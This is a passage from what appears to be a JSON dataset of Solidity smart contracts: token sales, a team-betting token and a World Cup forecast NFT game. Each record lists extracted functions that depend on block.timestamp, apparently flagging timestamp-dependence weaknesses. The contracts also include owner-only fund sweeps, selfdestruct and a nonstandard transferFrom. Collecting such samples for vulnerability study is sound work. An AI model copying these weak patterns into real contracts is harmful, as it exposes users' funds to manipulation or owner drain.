function authorize(address _recipient, bool _isERC223) public onlyOwner {\n require(_recipient != address(0));\n authorizedRecipients[_recipient] = true;\n erc223Recipients[_recipient] = _isERC223;\n }\n function deauthorize(address _recipient) public onlyOwner isAuthorizedRecipient(_recipient) {\n authorizedRecipients[_recipient] = false;\n erc223Recipients[_recipient] = false;\n }\n function transfer(address _to, uint256 _value) public isAuthorizedRecipient(_to) returns (bool) {\n if (erc223Recipients[_to]) {\n BasicERC223Receiver receiver = BasicERC223Receiver(_to);\n bytes memory empty;\n receiver.tokenFallback(msg.sender, _value, empty);\n }\n return super.transfer(_to, _value);\n }\n function issue(address _to, uint256 _value) public onlyIssuer returns (bool) {\n lastIssuedTime[_to] = block.timestamp;\n emit Issue(_to, _value);\n return super.transfer(_to, _value);\n }\n}\ncontract ExtendedPrivateSale is TokenlessCrowdsale, WhitelistedAICrowdsale, FiatCappedCrowdsale, PausableCrowdsale {\n using SafeMath for uint256;\n RestrictedToken public tokenR0;\n RestrictedToken public tokenR6;\n uint8 constant bonusPct = 30;\n constructor (address _wallet, uint256 _millWeiRate) TokenlessCrowdsale(_wallet)\n FiatCappedCrowdsale(\n 2000000 * (10 ** 3),\n 10000 * (10 ** 3),\n (10 ** 18) / 50,\n _millWeiRate\n )\n public {\n tokenR0 = new RestrictedToken(\n 2 * 40000000 * (10 ** 18),\n 'Sparrow Token (Restricted)',\n 'SPX-R0',\n 18,\n 0,\n msg.sender,\n this\n );\n tokenR6 = new RestrictedToken(\n 2 * 52000000 * (10 ** 18),\n 'Sparrow Token (Restricted with 6-month vesting)',\n 'SPX-R6',\n 18,\n 6 * 30 * 86400,\n msg.sender,\n this\n );\n }\n function _processPurchaseInWei(address _beneficiary, uint256 _weiAmount) internal {\n super._processPurchaseInWei(_beneficiary, _weiAmount);\n uint256 tokens = _toLeconte(_weiAmount);\n uint256 bonus = tokens.mul(bonusPct).div(100);\n if (accredited[_beneficiary]) {\n tokenR0.issue(_beneficiary, tokens);\n tokenR6.issue(_beneficiary, bonus);\n } else {\n tokenR6.issue(_beneficiary, tokens.add(bonus));\n }\n }\n}",
  "extract_feature": [
    "function issue(address _to, uint256 _value) public onlyIssuer returns (bool) {\nlastIssuedTime[_to] = block.timestamp;\nemit Issue(_to, _value);\nreturn super.transfer(_to, _value);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1fa8"
  },
  "filename": "9978.sol",
  "content": "pragma solidity ^0.4.21;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract StandardToken {\n using SafeMath for uint256;\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n mapping(address => uint256) internal balances_;\n mapping(address => mapping(address => uint256)) internal allowed_;\n uint256 internal totalSupply_;\n string public name;\n string public symbol;\n uint8 public decimals;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances_[_owner];\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed_[_owner][_spender];\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances_[msg.sender]);\n balances_[msg.sender] = balances_[msg.sender].sub(_value);\n balances_[_to] = balances_[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances_[_from]);\n require(_value <= allowed_[_from][msg.sender]);\n balances_[_from] = balances_[_from].sub(_value);\n balances_[_to] = balances_[_to].add(_value);\n allowed_[_from][msg.sender] = allowed_[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed_[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n}\ncontract EthTeamContract is StandardToken, Ownable {\n event Buy(address indexed token, address indexed from, uint256 value, uint256 weiValue);\n event Sell(address indexed token, address indexed from, uint256 value, uint256 weiValue);\n event BeginGame(address indexed team1, address indexed team2, uint64 gameTime);\n event EndGame(address indexed team1, address indexed team2, uint8 gameResult);\n event ChangeStatus(address indexed team, uint8 status);\n uint256 public price;\n uint8 public status;\n uint64 public gameTime;\n uint64 public finishTime;\n address public feeOwner;\n address public gameOpponent;\n function EthTeamContract(\n string _teamName, string _teamSymbol, address _gameOpponent, uint64 _gameTime, uint64 _finishTime, address _feeOwner\n ) public {\n name = _teamName;\n symbol = _teamSymbol;\n decimals = 3;\n totalSupply_ = 0;\n price = 1 szabo;\n gameOpponent = _gameOpponent;\n gameTime = _gameTime;\n finishTime = _finishTime;\n feeOwner = _feeOwner;\n owner = msg.sender;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n if (_to != address(this)) {\n return super.transfer(_to, _value);\n }\n require(_value <= balances_[msg.sender] && status == 0);\n if (gameTime > 1514764800) {\n require(gameTime > block.timestamp);\n }\n balances_[msg.sender] = balances_[msg.sender].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n uint256 weiAmount = price.mul(_value);\n msg.sender.transfer(weiAmount);\n emit Transfer(msg.sender, _to, _value);\n emit Sell(_to, msg.sender, _value, weiAmount);\n return true;\n }\n function() payable public {\n require(status == 0 && price > 0);\n if (gameTime > 1514764800) {\n require(gameTime > block.timestamp);\n }\n uint256 amount = msg.value.div(price);\n balances_[msg.sender] = balances_[msg.sender].add(amount);\n totalSupply_ = totalSupply_.add(amount);\n emit Transfer(address(this), msg.sender, amount);\n emit Buy(address(this), msg.sender, amount, msg.value);\n }\n function changeStatus(uint8 _status) onlyOwner public {\n require(status != _status);\n status = _status;\n emit ChangeStatus(address(this), _status);\n }\n function changeFeeOwner(address _feeOwner) onlyOwner public {\n require(_feeOwner != feeOwner && _feeOwner != address(0));\n feeOwner = _feeOwner;\n }\n function finish() onlyOwner public {\n require(block.timestamp >= finishTime);\n feeOwner.transfer(address(this).balance);\n }\n function beginGame(address _gameOpponent, uint64 _gameTime) onlyOwner public {\n require(_gameOpponent != address(this));\n require(_gameTime == 0 || (_gameTime > 1514764800));\n gameOpponent = _gameOpponent;\n gameTime = _gameTime;\n status = 0;\n emit BeginGame(address(this), _gameOpponent, _gameTime);\n }\n function endGame(address _gameOpponent, uint8 _gameResult) onlyOwner public {\n require(gameOpponent != address(0) && gameOpponent == _gameOpponent);\n uint256 amount = address(this).balance;\n uint256 opAmount = gameOpponent.balance;\n require(_gameResult == 1 || (_gameResult == 2 && amount >= opAmount) || _gameResult == 3);\n EthTeamContract op = EthTeamContract(gameOpponent);\n if (_gameResult == 1) {\n if (amount > 0 && totalSupply_ > 0) {\n uint256 lostAmount = amount;\n if (op.totalSupply() > 0) {\n uint256 feeAmount = lostAmount.div(20);\n lostAmount = lostAmount.sub(feeAmount);\n feeOwner.transfer(feeAmount);\n op.transferFundAndEndGame.value(lostAmount)();\n } else {\n feeOwner.transfer(lostAmount);\n op.transferFundAndEndGame();\n }\n } else {\n op.transferFundAndEndGame();\n }\n } else if (_gameResult == 2) {\n if (amount > opAmount) {\n lostAmount = amount.sub(opAmount).div(2);\n if (op.totalSupply() > 0) {\n feeAmount = lostAmount.div(20);\n lostAmount = lostAmount.sub(feeAmount);\n feeOwner.transfer(feeAmount);\n op.transferFundAndEndGame.value(lostAmount)();\n } else {\n feeOwner.transfer(lostAmount);\n op.transferFundAndEndGame();\n }\n } else if (amount == opAmount) {\n op.transferFundAndEndGame();\n } else {\n revert();\n }\n } else if (_gameResult == 3) {\n op.transferFundAndEndGame();\n } else {\n revert();\n }\n endGameInternal();\n if (totalSupply_ > 0) {\n price = address(this).balance.div(totalSupply_);\n }\n emit EndGame(address(this), _gameOpponent, _gameResult);\n }\n function endGameInternal() private {\n gameOpponent = address(0);\n gameTime = 0;\n status = 0;\n }\n function transferFundAndEndGame() payable public {\n require(gameOpponent != address(0) && gameOpponent == msg.sender);\n if (msg.value > 0 && totalSupply_ > 0) {\n price = address(this).balance.div(totalSupply_);\n }\n endGameInternal();\n }\n}",
  "extract_feature": [
    "function transfer(address _to, uint256 _value) public returns (bool) {\nif (_to != address(this)) {\nreturn super.transfer(_to, _value);\n}\nrequire(_value <= balances_[msg.sender] && status == 0);\nif (gameTime > 1514764800) {\nrequire(gameTime > block.timestamp);\n}\nbalances_[msg.sender] = balances_[msg.sender].sub(_value);\ntotalSupply_ = totalSupply_.sub(_value);\nuint256 weiAmount = price.mul(_value);\nmsg.sender.transfer(weiAmount);\nemit Transfer(msg.sender, _to, _value);\nemit Sell(_to, msg.sender, _value, weiAmount);\nreturn true;\n}",
    "function finish() onlyOwner public {\nrequire(block.timestamp >= finishTime);\nfeeOwner.transfer(address(this).balance);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1fa9"
  },
  "filename": "9987.sol",
  "content": "pragma solidity ^0.4.21;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract ERC20Basic {\n uint256 public totalSupply;\n function balanceOf(address who) public constant returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public constant returns (uint256);\n function transferFrom(address from, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract DQCoin is ERC20 {\n using SafeMath for uint256;\n address public owner;\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n string public name = \"DaQianCoin\";\n string public constant symbol = \"DQC\";\n uint public constant decimals = 18;\n bool public stopped;\n modifier stoppable {\n assert(!stopped);\n _;\n }\n uint256 public totalSupply = 24000000000*(10**18);\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n event LOCK(address indexed _owner, uint256 _value);\n mapping (address => uint256) public lockAddress;\n modifier lock(address _add){\n require(_add != address(0));\n uint256 releaseTime = lockAddress[_add];\n if(releaseTime > 0){\n require(block.timestamp >= releaseTime);\n _;\n }else{\n _;\n }\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function DQCoin() public {\n owner = msg.sender;\n balances[msg.sender] = totalSupply;\n }\n function stop() onlyOwner public {\n stopped = true;\n }\n function start() onlyOwner public {\n stopped = false;\n }\n function lockTime(address _to,uint256 _value) onlyOwner public {\n if(_value > block.timestamp){\n lockAddress[_to] = _value;\n emit LOCK(_to, _value);\n }\n }\n function lockOf(address _owner) constant public returns (uint256) {\n return lockAddress[_owner];\n }\n function transferOwnership(address _newOwner) onlyOwner public {\n if (_newOwner != address(0)) {\n owner = _newOwner;\n }\n }\n function () public payable {\n address myAddress = this;\n emit Transfer(msg.sender, myAddress, msg.value);\n }\n function balanceOf(address _owner) constant public returns (uint256) {\n return balances[_owner];\n }\n function transfer(address _to, uint256 _amount) stoppable lock(msg.sender) public returns (bool success) {\n require(_to != address(0));\n require(_amount <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_amount);\n balances[_to] = balances[_to].add(_amount);\n emit Transfer(msg.sender, _to, _amount);\n return true;\n }\n function transferFrom(address _from, uint256 _amount) stoppable lock(_from) public returns (bool success) {\n require(_amount <= balances[_from]);\n require(_amount <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_amount);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_amount);\n balances[msg.sender] = balances[msg.sender].add(_amount);\n emit Transfer(_from, msg.sender, _amount);\n return true;\n }\n function approve(address _spender, uint256 _value) stoppable lock(_spender) public returns (bool success) {\n if (_value != 0 && allowed[msg.sender][_spender] != 0) { return false; }\n allowed[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant public returns (uint256) {\n return allowed[_owner][_spender];\n }\n function withdraw() onlyOwner public {\n address myAddress = this;\n uint256 etherBalance = myAddress.balance;\n owner.transfer(etherBalance);\n }\n function kill() onlyOwner public {\n selfdestruct(msg.sender);\n }\n function setName(string _name) onlyOwner public {\n name = _name;\n }\n}",
  "extract_feature": [
    "function lockTime(address _to,uint256 _value) onlyOwner public {\nif(_value > block.timestamp){\nlockAddress[_to] = _value;\nemit LOCK(_to, _value);\n}\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1faa"
  },
  "filename": "9994.sol",
  "content": "pragma solidity ^0.4.23;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n if (a == 0) {\n return 0;\n }\n c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256 c) {\n c = a + b;\n assert(c >= a);\n return c;\n }\n}\nlibrary AddressUtils {\n function isContract(address addr) internal view returns (bool) {\n uint256 size;\n assembly { size := extcodesize(addr) }\n return size > 0;\n }\n}\ncontract Ownable {\n address public owner;\n address public admin;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n constructor() public {\n owner = msg.sender;\n admin = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n modifier onlyAdmin() {\n require(msg.sender == admin || msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n function setAdmin(address newAdmin) public onlyOwner {\n require(newAdmin != address(0));\n admin = newAdmin;\n }\n}\ncontract Pausable is Ownable {\n bool public paused = true;\n modifier whenNotPaused() {\n require(!paused);\n _;\n }\n modifier whenPaused {\n require(paused);\n _;\n }\n function pause() public onlyOwner whenNotPaused {\n paused = true;\n }\n function unpause() public onlyOwner whenPaused {\n paused = false;\n }\n}\ncontract BrokenContract is Pausable {\n address public newContractAddress;\n function setNewAddress(address _v2Address) external onlyOwner whenPaused {\n owner.transfer(address(this).balance);\n newContractAddress = _v2Address;\n }\n}\ncontract ERC721Basic {\n event Transfer(address indexed _from, address indexed _to, uint256 _tokenId);\n function balanceOf(address _owner) public view returns (uint256 _balance);\n function ownerOf(uint256 _tokenId) public view returns (address _owner);\n function exists(uint256 _tokenId) public view returns (bool _exists);\n}\ncontract ERC721Enumerable is ERC721Basic {\n function totalSupply() public view returns (uint256);\n function tokenOfOwnerByIndex(address _owner, uint256 _index) public view returns (uint256 _tokenId);\n function tokenByIndex(uint256 _index) public view returns (uint256);\n}\ncontract ERC721Metadata is ERC721Basic {\n function name() public view returns (string _name);\n function symbol() public view returns (string _symbol);\n}\ncontract ERC721 is ERC721Basic, ERC721Enumerable, ERC721Metadata {\n}\ncontract ERC721BasicToken is BrokenContract, ERC721Basic {\n using SafeMath for uint256;\n using AddressUtils for address;\n mapping (uint256 => address) internal tokenOwner;\n mapping (address => uint256) internal ownedTokensCount;\n modifier onlyOwnerOf(uint256 _tokenId) {\n require(ownerOf(_tokenId) == msg.sender);\n _;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n require(_owner != address(0));\n return ownedTokensCount[_owner];\n }\n function ownerOf(uint256 _tokenId) public view returns (address) {\n address owner = tokenOwner[_tokenId];\n require(owner != address(0));\n return owner;\n }\n function exists(uint256 _tokenId) public view returns (bool) {\n address owner = tokenOwner[_tokenId];\n return owner != address(0);\n }\n function isApprovedOrOwner(address _spender, uint256 _tokenId) internal view returns (bool) {\n address owner = ownerOf(_tokenId);\n return _spender == owner ;\n }\n function _mint(address _to, uint256 _tokenId) internal {\n require(_to != address(0));\n addTokenTo(_to, _tokenId);\n emit Transfer(address(0), _to, _tokenId);\n }\n function addTokenTo(address _to, uint256 _tokenId) internal {\n require(tokenOwner[_tokenId] == address(0));\n tokenOwner[_tokenId] = _to;\n ownedTokensCount[_to] = ownedTokensCount[_to].add(1);\n }\n function removeTokenFrom(address _from, uint256 _tokenId) internal {\n require(ownerOf(_tokenId) == _from);\n ownedTokensCount[_from] = ownedTokensCount[_from].sub(1);\n tokenOwner[_tokenId] = address(0);\n }\n}\ncontract ERC721Token is ERC721, ERC721BasicToken {\n string internal name_;\n string internal symbol_;\n mapping(address => uint256[]) internal ownedTokens;\n mapping(uint256 => uint256) internal ownedTokensIndex;\n uint256[] internal allTokens;\n mapping(uint256 => uint256) internal allTokensIndex;\n constructor(string _name, string _symbol) public {\n name_ = _name;\n symbol_ = _symbol;\n }\n function name() public view returns (string) {\n return name_;\n }\n function symbol() public view returns (string) {\n return symbol_;\n }\n function tokenOfOwnerByIndex(address _owner, uint256 _index) public view returns (uint256) {\n require(_index < balanceOf(_owner));\n return ownedTokens[_owner][_index];\n }\n function totalSupply() public view returns (uint256) {\n return allTokens.length;\n }\n function tokenByIndex(uint256 _index) public view returns (uint256) {\n require(_index < totalSupply());\n return allTokens[_index];\n }\n function addTokenTo(address _to, uint256 _tokenId) internal {\n super.addTokenTo(_to, _tokenId);\n uint256 length = ownedTokens[_to].length;\n ownedTokens[_to].push(_tokenId);\n ownedTokensIndex[_tokenId] = length;\n }\n function removeTokenFrom(address _from, uint256 _tokenId) internal {\n super.removeTokenFrom(_from, _tokenId);\n uint256 tokenIndex = ownedTokensIndex[_tokenId];\n uint256 lastTokenIndex = ownedTokens[_from].length.sub(1);\n uint256 lastToken = ownedTokens[_from][lastTokenIndex];\n ownedTokens[_from][tokenIndex] = lastToken;\n ownedTokens[_from][lastTokenIndex] = 0;\n ownedTokens[_from].length--;\n ownedTokensIndex[_tokenId] = 0;\n ownedTokensIndex[lastToken] = tokenIndex;\n }\n function _mint(address _to, uint256 _tokenId) internal {\n super._mint(_to, _tokenId);\n allTokensIndex[_tokenId] = allTokens.length;\n allTokens.push(_tokenId);\n }\n}\ncontract BaseGame is ERC721Token {\n event NewAccount(address owner, uint tokenId, uint parentTokenId, uint blockNumber);\n event NewForecast(address owner, uint tokenId, uint forecastId, uint _gameId,\n uint _forecastData);\n struct Token {\n uint createBlockNumber;\n uint parentId;\n }\n enum Teams { DEF,\n RUS, SAU, EGY, URY,\n PRT, ESP, MAR, IRN,\n FRA, AUS, PER, DNK,\n ARG, ISL, HRV, NGA,\n BRA, CHE, CRI, SRB,\n DEU, MEX, SWE, KOR,\n BEL, PAN, TUN, GBR,\n POL, SEN, COL, JPN\n }\n event GameChanged(uint _gameId, uint64 gameDate, Teams teamA, Teams teamB,\n uint goalA, uint goalB, bool odds, uint shotA, uint shotB);\n struct Game {\n uint64 gameDate;\n Teams teamA;\n Teams teamB;\n uint goalA;\n uint goalB;\n bool odds;\n uint shotA;\n uint shotB;\n uint[] forecasts;\n }\n struct Forecast {\n uint gameId;\n uint forecastBlockNumber;\n uint forecastData;\n }\n Token[] tokens;\n mapping (uint => Game) games;\n Forecast[] forecasts;\n mapping (uint => uint) internal forecastToToken;\n mapping (uint => uint[]) internal tokenForecasts;\n constructor(string _name, string _symbol) ERC721Token(_name, _symbol) public {}\n function _createToken(uint _parentId, address _owner) internal whenNotPaused\n returns (uint) {\n Token memory _token = Token({\n createBlockNumber: block.number,\n parentId: _parentId\n });\n uint newTokenId = tokens.push(_token) - 1;\n emit NewAccount(_owner, newTokenId, uint(_token.parentId), uint(_token.createBlockNumber));\n _mint(_owner, newTokenId);\n return newTokenId;\n }\n function _createForecast(uint _tokenId, uint _gameId, uint _forecastData) internal whenNotPaused returns (uint) {\n require(_tokenId < tokens.length);\n Forecast memory newForecast = Forecast({\n gameId: _gameId,\n forecastBlockNumber: block.number,\n forecastData: _forecastData\n });\n uint newForecastId = forecasts.push(newForecast) - 1;\n forecastToToken[newForecastId] = _tokenId;\n tokenForecasts[_tokenId].push(newForecastId);\n games[_gameId].forecasts.push(newForecastId);\n emit NewForecast(tokenOwner[_tokenId], _tokenId, newForecastId, _gameId, _forecastData);\n return newForecastId;\n }\n}\ncontract BaseGameLogic is BaseGame {\n uint public prizeFund = 0;\n uint public basePrice = 21 finney;\n uint public gameCloneFee = 7000;\n uint public priceFactor = 10000;\n uint public prizeFundFactor = 5000;\n constructor(string _name, string _symbol) BaseGame(_name, _symbol) public {}\n function _addToFund(uint _val, bool isAll) internal whenNotPaused {\n if(isAll) {\n prizeFund = prizeFund.add(_val);\n } else {\n prizeFund = prizeFund.add(_val.mul(prizeFundFactor).div(10000));\n }\n }\n function createAccount() external payable whenNotPaused returns (uint) {\n require(msg.value >= basePrice);\n _addToFund(msg.value, false);\n return _createToken(0, msg.sender);\n }\n function cloneAccount(uint _tokenId) external payable whenNotPaused returns (uint) {\n require(exists(_tokenId));\n uint tokenPrice = calculateTokenPrice(_tokenId);\n require(msg.value >= tokenPrice);\n uint newToken = _createToken( _tokenId, msg.sender);\n uint gameFee = tokenPrice.mul(gameCloneFee).div(10000);\n _addToFund(gameFee, false);\n uint ownerProceed = tokenPrice.sub(gameFee);\n address tokenOwnerAddress = tokenOwner[_tokenId];\n tokenOwnerAddress.transfer(ownerProceed);\n return newToken;\n }\n function createForecast(uint _tokenId, uint _gameId,\n uint8 _goalA, uint8 _goalB, bool _odds, uint8 _shotA, uint8 _shotB)\n external whenNotPaused onlyOwnerOf(_tokenId) returns (uint){\n require(exists(_tokenId));\n require(block.timestamp < games[_gameId].gameDate);\n uint _forecastData = toForecastData(_goalA, _goalB, _odds, _shotA, _shotB);\n return _createForecast(_tokenId, _gameId, _forecastData);\n }\n function tokensOfOwner(address _owner) public view returns(uint[] ownerTokens) {\n uint tokenCount = balanceOf(_owner);\n if (tokenCount == 0) {\n return new uint[](0);\n } else {\n uint[] memory result = new uint[](tokenCount);\n uint totalToken = totalSupply();\n uint resultIndex = 0;\n uint _tokenId;\n for (_tokenId = 1; _tokenId <= totalToken; _tokenId++) {\n if (tokenOwner[_tokenId] == _owner) {\n result[resultIndex] = _tokenId;\n resultIndex++;\n }\n }\n return result;\n }\n }\n function forecastOfToken(uint _tokenId) public view returns(uint[]) {\n uint forecastCount = tokenForecasts[_tokenId].length;\n if (forecastCount == 0) {\n return new uint[](0);\n } else {\n uint[] memory result = new uint[](forecastCount);\n uint resultIndex;\n for (resultIndex = 0; resultIndex < forecastCount; resultIndex++) {\n result[resultIndex] = tokenForecasts[_tokenId][resultIndex];\n }\n return result;\n }\n }\n function gameInfo(uint _gameId) external view returns(\n uint64 gameDate, Teams teamA, Teams teamB, uint goalA, uint gaolB,\n bool odds, uint shotA, uint shotB, uint forecastCount\n ){\n gameDate = games[_gameId].gameDate;\n teamA = games[_gameId].teamA;\n teamB = games[_gameId].teamB;\n goalA = games[_gameId].goalA;\n gaolB = games[_gameId].goalB;\n odds = games[_gameId].odds;\n shotA = games[_gameId].shotA;\n shotB = games[_gameId].shotB;\n forecastCount = games[_gameId].forecasts.length;\n }\n function forecastInfo(uint _fId) external view\n returns(uint gameId, uint f) {\n gameId = forecasts[_fId].gameId;\n f = forecasts[_fId].forecastData;\n }\n function tokenInfo(uint _tokenId) external view\n returns(uint createBlockNumber, uint parentId, uint forecast, uint score, uint price) {\n createBlockNumber = tokens[_tokenId].createBlockNumber;\n parentId = tokens[_tokenId].parentId;\n price = calculateTokenPrice(_tokenId);\n forecast = getForecastCount(_tokenId, block.number, false);\n score = getScore(_tokenId);\n }\n function calculateTokenPrice(uint _tokenId) public view returns(uint) {\n require(exists(_tokenId));\n uint forecastCount = getForecastCount(_tokenId, block.number, true);\n return (forecastCount.add(1)).mul(basePrice).mul(priceFactor).div(10000);\n }\n function getForecastCount(uint _tokenId, uint _blockNumber, bool isReleased) public view returns(uint) {\n require(exists(_tokenId));\n uint forecastCount = 0 ;\n uint index = 0;\n uint count = tokenForecasts[_tokenId].length;\n for (index = 0; index < count; index++) {\n if(forecasts[tokenForecasts[_tokenId][index]].forecastBlockNumber < _blockNumber){\n if(isReleased) {\n if (games[forecasts[tokenForecasts[_tokenId][index]].gameId].gameDate < block.timestamp) {\n forecastCount = forecastCount + 1;\n }\n } else {\n forecastCount = forecastCount + 1;\n }\n }\n }\n if(tokens[_tokenId].parentId != 0){\n forecastCount = forecastCount.add(getForecastCount(tokens[_tokenId].parentId,\n tokens[_tokenId].createBlockNumber, isReleased));\n }\n return forecastCount;\n }\n function getScore(uint _tokenId) public view returns (uint){\n uint[] memory _gameForecast = new uint[](65);\n return getScore(_tokenId, block.number, _gameForecast);\n }\n function getScore(uint _tokenId, uint _blockNumber, uint[] _gameForecast) public view returns (uint){\n uint score = 0;\n uint[] memory _forecasts = forecastOfToken(_tokenId);\n if (_forecasts.length > 0){\n uint256 _index;\n for(_index = _forecasts.length - 1; _index >= 0 && _index < _forecasts.length ; _index--){\n if(forecasts[_forecasts[_index]].forecastBlockNumber < _blockNumber &&\n _gameForecast[forecasts[_forecasts[_index]].gameId] == 0 &&\n block.timestamp > games[forecasts[_forecasts[_index]].gameId].gameDate\n ){\n score = score.add(calculateScore(\n forecasts[_forecasts[_index]].gameId,\n forecasts[_forecasts[_index]].forecastData\n ));\n _gameForecast[forecasts[_forecasts[_index]].gameId] = forecasts[_forecasts[_index]].forecastBlockNumber;\n }\n }\n }\n if(tokens[_tokenId].parentId != 0){\n score = score.add(getScore(tokens[_tokenId].parentId, tokens[_tokenId].createBlockNumber, _gameForecast));\n }\n return score;\n }\n function getForecastScore(uint256 _forecastId) external view returns (uint256) {\n require(_forecastId < forecasts.length);\n return calculateScore(\n forecasts[_forecastId].gameId,\n forecasts[_forecastId].forecastData\n );\n }\n function calculateScore(uint256 _gameId, uint d)\n public view returns (uint256){\n require(block.timestamp > games[_gameId].gameDate);\n uint256 _shotB = (d & 0xff);\n d = d >> 8;\n uint256 _shotA = (d & 0xff);\n d = d >> 8;\n uint odds8 = (d & 0xff);\n bool _odds = odds8 == 1 ? true: false;\n d = d >> 8;\n uint256 _goalB = (d & 0xff);\n d = d >> 8;\n uint256 _goalA = (d & 0xff);\n d = d >> 8;\n Game memory cGame = games[_gameId];\n uint256 _score = 0;\n bool isDoubleScore = true;\n if(cGame.shotA == _shotA) {\n _score = _score.add(1);\n } else {\n isDoubleScore = false;\n }\n if(cGame.shotB == _shotB) {\n _score = _score.add(1);\n } else {\n isDoubleScore = false;\n }\n if(cGame.odds == _odds) {\n _score = _score.add(1);\n } else {\n isDoubleScore = false;\n }\n if((cGame.goalA + cGame.goalB) == (_goalA + _goalB)) {\n _score = _score.add(2);\n } else {\n isDoubleScore = false;\n }\n if(cGame.goalA == _goalA && cGame.goalB == _goalB) {\n _score = _score.add(3);\n } else {\n isDoubleScore = false;\n }\n if( ((cGame.goalA > cGame.goalB) && (_goalA > _goalB)) ||\n ((cGame.goalA < cGame.goalB) && (_goalA < _goalB)) ||\n ((cGame.goalA == cGame.goalB) && (_goalA == _goalB))) {\n _score = _score.add(1);\n } else {\n isDoubleScore = false;\n }\n if(isDoubleScore) {\n _score = _score.mul(2);\n }\n return _score;\n }\n function setBasePrice(uint256 _val) external onlyAdmin {\n require(_val > 0);\n basePrice = _val;\n }\n function setGameCloneFee(uint256 _val) external onlyAdmin {\n require(_val <= 10000);\n gameCloneFee = _val;\n }\n function setPrizeFundFactor(uint256 _val) external onlyAdmin {\n require(_val <= 10000);\n prizeFundFactor = _val;\n }\n function setPriceFactor(uint256 _val) external onlyAdmin {\n priceFactor = _val;\n }\n function gameEdit(uint256 _gameId, uint64 gameDate,\n Teams teamA, Teams teamB)\n external onlyAdmin {\n games[_gameId].gameDate = gameDate;\n games[_gameId].teamA = teamA;\n games[_gameId].teamB = teamB;\n emit GameChanged(_gameId, games[_gameId].gameDate, games[_gameId].teamA, games[_gameId].teamB,\n 0, 0, true, 0, 0);\n }\n function gameResult(uint256 _gameId, uint256 goalA, uint256 goalB, bool odds, uint256 shotA, uint256 shotB)\n external onlyAdmin {\n games[_gameId].goalA = goalA;\n games[_gameId].goalB = goalB;\n games[_gameId].odds = odds;\n games[_gameId].shotA = shotA;\n games[_gameId].shotB = shotB;\n emit GameChanged(_gameId, games[_gameId].gameDate, games[_gameId].teamA, games[_gameId].teamB,\n goalA, goalB, odds, shotA, shotB);\n }\n function toForecastData(uint8 _goalA, uint8 _goalB, bool _odds, uint8 _shotA, uint8 _shotB)\n pure internal returns (uint) {\n uint forecastData;\n forecastData = forecastData << 8 | _goalA;\n forecastData = forecastData << 8 | _goalB;\n uint8 odds8 = _odds ? 1 : 0;\n forecastData = forecastData << 8 | odds8;\n forecastData = forecastData << 8 | _shotA;\n forecastData = forecastData << 8 | _shotB;\n return forecastData;\n }\n}\ncontract 